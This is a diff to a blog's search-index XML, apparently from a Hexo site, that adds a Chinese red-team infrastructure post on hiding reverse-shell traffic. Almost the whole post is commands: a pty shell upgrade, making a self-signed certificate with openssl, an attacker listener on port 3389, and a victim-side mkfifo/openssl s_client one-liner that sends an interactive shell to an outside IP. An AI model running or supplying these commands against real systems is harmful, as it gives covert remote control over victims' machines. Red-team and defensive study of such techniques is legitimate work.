@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>红队基础建设</title>
+    <link href="/2022/07/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE/"/>
+    <url>/2022/07/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE/</url>
+    
+    <content type="html"><![CDATA[<h1 id="红队基础建设"><a href="#红队基础建设" class="headerlink" title="红队基础建设"></a>红队基础建设</h1><h2 id="隐匿"><a href="#隐匿" class="headerlink" title="隐匿"></a>隐匿</h2><h3 id="流量加密shell反弹"><a href="#流量加密shell反弹" class="headerlink" title="流量加密shell反弹"></a>流量加密shell反弹</h3><h4 id="反弹shell升级"><a href="#反弹shell升级" class="headerlink" title="反弹shell升级"></a>反弹shell升级</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>可以完全使用bash命令</p><h4 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h4><p>1.利用OpenSSL生成自签名证书</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes<br></code></pre></td></tr></table></figure><p>2.攻击机监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl s_server -quiet -key key.pem -cert cert.pem -port 3389<br></code></pre></td></tr></table></figure><p>3.受害机连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.0.0.0:3389&gt;/tmp/s;rm /tmp/s<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>redtem,基础</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>good</title>
     <link href="/2022/07/10/good/"/>
     <url>/2022/07/10/good/</url>
